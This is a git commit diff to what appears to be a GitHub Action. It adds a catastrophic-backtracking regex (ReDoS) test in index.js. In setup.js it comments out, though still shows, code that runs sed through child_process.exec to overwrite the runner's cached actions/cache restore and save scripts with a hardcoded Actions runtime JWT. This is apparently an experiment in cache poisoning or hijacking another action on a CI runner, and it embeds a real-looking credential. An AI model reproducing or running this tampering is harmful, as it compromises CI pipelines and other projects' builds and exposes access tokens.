1ae2073d6f103542e041a86d8290c56a78b3d817
musset0 <musset025@gmail.com>
2023-09-18 20:25:52 -0400

    new v1.1.2

--- index.js
+++ index.js
@@ -11,6 +11,14 @@ try {
     // let path = process.env["GITHUB_OUTPUT"];
     // console.log(path);
 
+    var reg = /^(a*)*b$/;
+
+    console.log(new Date());
+
+    var result = reg.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa');
+    console.log(result);
+
+    console.log(new Date());
 
     const nameToGreet = core.getInput('who-to-greet');
     console.log(`Say Hello ${nameToGreet}!`);
--- setup.js
+++ setup.js
@@ -28,23 +28,23 @@ console.log("this is a setup.....")
 
 
 // use the printed token
-let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImVCWl9jbjNzWFlBZDBjaDRUSEJLSElnT3dPRSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlJlc3VsdHM6M2EzOTQzZjgtOWRmNy00YWU3LTlmZDQtZWExM2YxODI3ZTVmOjJlODQ3MTM3LWFlNzAtNTQxZC1hNDU0LWYxMDA3YWI3ZTNiYiBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8zMzUgTG9jYXRpb25TZXJ2aWNlLkNvbm5lY3QgUmVhZEFuZFVwZGF0ZUJ1aWxkQnlVcmk6MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwLzE6QnVpbGQvQnVpbGQvMzM1IiwiSWRlbnRpdHlUeXBlQ2xhaW0iOiJTeXN0ZW06U2VydmljZUlkZW50aXR5IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc2lkIjoiREREREREREQtRERERC1ERERELUREREQtREREREREREREREREIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9wcmltYXJ5c2lkIjoiZGRkZGRkZGQtZGRkZC1kZGRkLWRkZGQtZGRkZGRkZGRkZGRkIiwiYXVpIjoiYzY5MjVjODktNTg5ZC00N2E4LWJlYmUtYWZkM2Q3M2ZlM2UyIiwic2lkIjoiNzM0YWFjMGItYjY2NS00MWU5LWIzOGYtZTEwZWI4ZjU0YWI1IiwiYWMiOiJbe1wiU2NvcGVcIjpcInJlZnMvaGVhZHMvbWFpblwiLFwiUGVybWlzc2lvblwiOjN9XSIsImFjc2wiOiIxMCIsIm9yY2hpZCI6IjNhMzk0M2Y4LTlkZjctNGFlNy05ZmQ0LWVhMTNmMTgyN2U1Zi51c2UuX19kZWZhdWx0IiwiaXNzIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImF1ZCI6InZzdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb218dnNvOmRiNDZmZDE4LTMxOWQtNGRkYS1hODBjLWIyN2I5NzBkZDZhMiIsIm5iZiI6MTY5Mzg2NDM1MywiZXhwIjoxNjkzODg3MTUzfQ.IH00oo14PC5n5yKmS2RWs7WGykcq_kjP9t5K8IQ20egQum5Sgws2CS03hLMt-BntlDIwQhY1nxWNakOW8ayFek2VPYtHMTAEcOPz-VYG7VGVWC7jZbMpE2xFeHjrI0o08LOxXeNx5iOsZSoH7wKbZfQqtSMBlY1-ZzQ3i7V0tg1hZj8bygHZJPpQmlXTWwBxb0AxJd4AqXBSRU-tSuUnXNMV0yME5yMRCOvDIdNCgw1FewjH-tJHMYWERx4sRjxjt8JadUs9GfCGDXH1Pa8dm26Q8ZOB4ptMSgRsjpbvhTQeBE02mJLP-G2N60Iw6vFsp7mTRNY6nidR8h4o-dVUjg"';
+// let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImVCWl9jbjNzWFlBZDBjaDRUSEJLSElnT3dPRSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlJlc3VsdHM6M2EzOTQzZjgtOWRmNy00YWU3LTlmZDQtZWExM2YxODI3ZTVmOjJlODQ3MTM3LWFlNzAtNTQxZC1hNDU0LWYxMDA3YWI3ZTNiYiBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8zMzUgTG9jYXRpb25TZXJ2aWNlLkNvbm5lY3QgUmVhZEFuZFVwZGF0ZUJ1aWxkQnlVcmk6MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwLzE6QnVpbGQvQnVpbGQvMzM1IiwiSWRlbnRpdHlUeXBlQ2xhaW0iOiJTeXN0ZW06U2VydmljZUlkZW50aXR5IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc2lkIjoiREREREREREQtRERERC1ERERELUREREQtREREREREREREREREIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9wcmltYXJ5c2lkIjoiZGRkZGRkZGQtZGRkZC1kZGRkLWRkZGQtZGRkZGRkZGRkZGRkIiwiYXVpIjoiYzY5MjVjODktNTg5ZC00N2E4LWJlYmUtYWZkM2Q3M2ZlM2UyIiwic2lkIjoiNzM0YWFjMGItYjY2NS00MWU5LWIzOGYtZTEwZWI4ZjU0YWI1IiwiYWMiOiJbe1wiU2NvcGVcIjpcInJlZnMvaGVhZHMvbWFpblwiLFwiUGVybWlzc2lvblwiOjN9XSIsImFjc2wiOiIxMCIsIm9yY2hpZCI6IjNhMzk0M2Y4LTlkZjctNGFlNy05ZmQ0LWVhMTNmMTgyN2U1Zi51c2UuX19kZWZhdWx0IiwiaXNzIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImF1ZCI6InZzdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb218dnNvOmRiNDZmZDE4LTMxOWQtNGRkYS1hODBjLWIyN2I5NzBkZDZhMiIsIm5iZiI6MTY5Mzg2NDM1MywiZXhwIjoxNjkzODg3MTUzfQ.IH00oo14PC5n5yKmS2RWs7WGykcq_kjP9t5K8IQ20egQum5Sgws2CS03hLMt-BntlDIwQhY1nxWNakOW8ayFek2VPYtHMTAEcOPz-VYG7VGVWC7jZbMpE2xFeHjrI0o08LOxXeNx5iOsZSoH7wKbZfQqtSMBlY1-ZzQ3i7V0tg1hZj8bygHZJPpQmlXTWwBxb0AxJd4AqXBSRU-tSuUnXNMV0yME5yMRCOvDIdNCgw1FewjH-tJHMYWERx4sRjxjt8JadUs9GfCGDXH1Pa8dm26Q8ZOB4ptMSgRsjpbvhTQeBE02mJLP-G2N60Iw6vFsp7mTRNY6nidR8h4o-dVUjg"';
 
-cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
-    if (err){
-        console.log(err);
-        return;
-    }
-    console.log(`stdout: ${stdout.toString()}`);
-    console.log(`stderr: ${stderr}`);
-});
+// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
+//     if (err){
+//         console.log(err);
+//         return;
+//     }
+//     console.log(`stdout: ${stdout.toString()}`);
+//     console.log(`stderr: ${stderr}`);
+// });
 
-cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
-    if (err){
-        console.log(err);
-        return;
-    }
-    console.log(`stdout: ${stdout.toString()}`);
-    console.log(`stderr: ${stderr}`);
-});
+// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
+//     if (err){
+//         console.log(err);
+//         return;
+//     }
+//     console.log(`stdout: ${stdout.toString()}`);
+//     console.log(`stderr: ${stderr}`);
+// });
 
